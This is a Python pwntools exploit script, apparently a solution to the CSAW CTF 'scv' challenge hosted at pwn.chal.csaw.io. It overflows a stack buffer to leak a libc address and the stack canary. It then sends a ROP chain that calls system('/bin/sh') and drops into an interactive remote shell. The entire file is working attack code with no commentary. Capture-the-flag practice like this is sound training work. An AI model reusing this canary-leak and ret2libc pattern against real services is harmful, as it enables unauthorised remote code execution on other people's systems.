#usr/bin/python

from pwn import *

r = remote('pwn.chal.csaw.io',3764)
#r =  process('./scv')
print util.proc.pidof(r)
elf = ELF('./bc.so.6')

def feedscv(food):
	r.recvuntil('>>')
	r.sendline('1')
	r.recvuntil('>>')
	r.send(food)

def reviewfood():
	r.recvuntil('>>')
	r.sendline('2')

def mine():
	r.recvuntil('>>')
	r.sendline('3')

payload = ''
payload += 'A'*40
feedscv(payload)
reviewfood()
junk = r.recvuntil('WELL.....')
junk = r.recvline()
junk = r.recvn(66)
leak = u64(r.recvn(6).ljust(8,'\x00'))
log.info('leak is:%s' % hex(leak))
libc_base = leak - 0x3a299
log.info('libc base is:%s' % hex(libc_base))
binsh = next(elf.search('/bin/sh'))
sh_addr = libc_base + binsh
log.info('bin sh address is:%s' % hex(sh_addr))
system_addr = libc_base + 0x45390
log.info('system address is:%s' % hex(system_addr))

payload = ''
payload += 'A'*0xa8 + 'B'
feedscv(payload)
reviewfood()
junk = r.recvuntil('B')
canary = u64(r.recvn(7).strip().ljust(8,'\x00'))*0x100
log.info('canary is:%s' % hex(canary))

payload = ''
payload += 'A'*0xa8
payload += p64(canary)
payload += p64(0xdeadbeef)
payload += p64(0x400ea3) #pop rdi,ret
payload += p64(sh_addr)
payload += p64(system_addr)

feedscv(payload)
pause()
mine()

r.interactive()